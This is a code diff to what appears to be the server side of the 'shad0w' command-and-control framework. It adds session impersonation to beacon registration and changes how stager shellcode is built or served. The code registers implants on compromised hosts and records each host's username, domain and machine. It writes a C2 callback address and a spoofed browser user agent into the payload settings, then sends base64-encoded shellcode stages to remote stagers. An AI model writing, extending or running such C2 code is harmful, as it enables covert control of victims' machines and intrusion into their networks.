@@ -1,4 +1,5 @@
 import sys
+import base64
 from datetime import datetime
 
 from lib import tools
@@ -80,12 +81,13 @@ class Handler(object):
 
             if request.method == "POST":
 
-                username = request.form.get("username")
-                domain   = request.form.get("domain")
-                machine  = request.form.get("machine")
-                arch     = request.form.get("arch")
-                opsystem = request.form.get("os")
-                secure      = request.form.get("secure")
+                username     = request.form.get("username")
+                domain       = request.form.get("domain")
+                machine      = request.form.get("machine")
+                arch         = request.form.get("arch")
+                opsystem     = request.form.get("os")
+                secure       = request.form.get("secure")
+                impersonate  = request.form.get("impersonate")
 
                 if username and machine and domain:
                     beacon_id = tools.generate_beacon_id()
@@ -104,11 +106,16 @@ class Handler(object):
                     self.shad0w.beacons[beacon_id]["num"]          = self.shad0w.beacon_count
 
                     # store basic info about beacon
-                    self.shad0w.beacons[beacon_id]["domain"]       = domain
-                    self.shad0w.beacons[beacon_id]["machine"]      = machine
-                    self.shad0w.beacons[beacon_id]["username"]     = username
-                    self.shad0w.beacons[beacon_id]["arch"]         = arch
-                    self.shad0w.beacons[beacon_id]["os"]           = opsystem
+                    self.shad0w.beacons[beacon_id]["domain"]              = domain
+                    self.shad0w.beacons[beacon_id]["machine"]             = machine
+                    self.shad0w.beacons[beacon_id]["username"]            = username
+                    self.shad0w.beacons[beacon_id]["arch"]                = arch
+                    self.shad0w.beacons[beacon_id]["os"]                  = opsystem
+                    self.shad0w.beacons[beacon_id]["impersonate"]         = None
+
+                    # if we are impersonating a session then tell that beacon
+                    if impersonate is not None:
+                        self.shad0w.beacons[impersonate]["impersonate"] = beacon_id
 
                     if secure == "SECURE":
                         self.shad0w.beacons[beacon_id]["secure"]       = True
@@ -122,10 +129,11 @@ class Handler(object):
                     self.shad0w.beacons[beacon_id]["stay_alive"]   = True
 
                     # let the user know whats happening
-                    if domain != "NULL":
-                        self.shad0w.debug.log(f"Beacon: {domain}\\{username}@{machine} (ARCH: {arch}, OS: {opsystem}, Type: {secure})", log=True)
-                    else:
-                        self.shad0w.debug.log(f"Beacon: {username}@{machine} (ARCH: {arch}, OS: {opsystem}, Type: {secure})", log=True)
+                    if impersonate is None:
+                        if domain != "NULL":
+                            self.shad0w.debug.log(f"Beacon: {domain}\\{username}@{machine} (ARCH: {arch}, OS: {opsystem}, Type: {secure})", log=True)
+                        else:
+                            self.shad0w.debug.log(f"Beacon: {username}@{machine} (ARCH: {arch}, OS: {opsystem}, Type: {secure})", log=True)
 
                     # give the beacon there id, this is how we will identify them now
                     return self.builder.build(beacon_id=beacon_id, id=beacon_id)
@@ -152,32 +160,37 @@ class Handler(object):
             # get the variables for the make
             arch, platform, secure, static = buildtools.get_payload_variables(payload, warn=False)
 
-            # copy the correct source files into build directory
-            if static is not None:
-                # then we are building a static beacon
-                buildtools.clone_source_files(asm=True)
-            if static is None:
-                # the we are building a stager
-                buildtools.clone_source_files(asm=True, rootdir="stager")
+            if secure != "secure":
 
-            # change the settings file based on the args we been given
+                # copy the correct source files into build directory
+                if static is not None:
+                    # then we are building a static beacon
+                    buildtools.clone_source_files(asm=True)
+                if static is None:
+                    # the we are building a stager
+                    buildtools.clone_source_files(asm=True, rootdir="stager")
 
-            # these settings should be given by the stager in its request
-            settings_template = """#define _C2_CALLBACK_ADDRESS L"%s"
-#define _C2_CALLBACK_PORT %s
-#define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
-#define _CALLBACK_JITTER %s000
-""" % (self.shad0w.endpoint, self.shad0w.addr[1], 1)
+                # change the settings file based on the args we been given
 
-            buildtools.update_settings_file(None, custom_template=settings_template)
+                # these settings should be given by the stager in its request
+                settings_template = """#define _C2_CALLBACK_ADDRESS L"%s"
+    #define _C2_CALLBACK_PORT %s
+    #define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
+    #define _CALLBACK_JITTER %s000
+    """ % (self.shad0w.endpoint, self.shad0w.addr[1], 1)
 
-            # now we need to run 'make' inside the cloned dir
-            self.shad0w.debug.spinner(f"Preparing stage...")
-            buildtools.make_in_clone(arch=arch, platform=platform, secure=secure, static=static)
-            self.shad0w.debug.stop_spinner = True
+                buildtools.update_settings_file(None, custom_template=settings_template)
 
-            # get the shellcode from the payload
-            rcode = buildtools.extract_shellcode(want_base64=True)
+                # now we need to run 'make' inside the cloned dir
+                self.shad0w.debug.spinner(f"Preparing stage...")
+                buildtools.make_in_clone(arch=arch, platform=platform, secure=secure, static=static)
+                self.shad0w.debug.stop_spinner = True
+
+                # get the shellcode from the payload
+                rcode = buildtools.extract_shellcode(want_base64=True)
+
+            else:
+                rcode = base64.b64encode(self.shad0w.payloads["x64_secure_static"]["bin"]).decode()
 
             # give the shellcode to the stager
             self.shad0w.debug.log(f"Sending stage {self.shad0w.endpoint} --> {request.remote_addr} ({len(rcode)} bytes)", log=True)
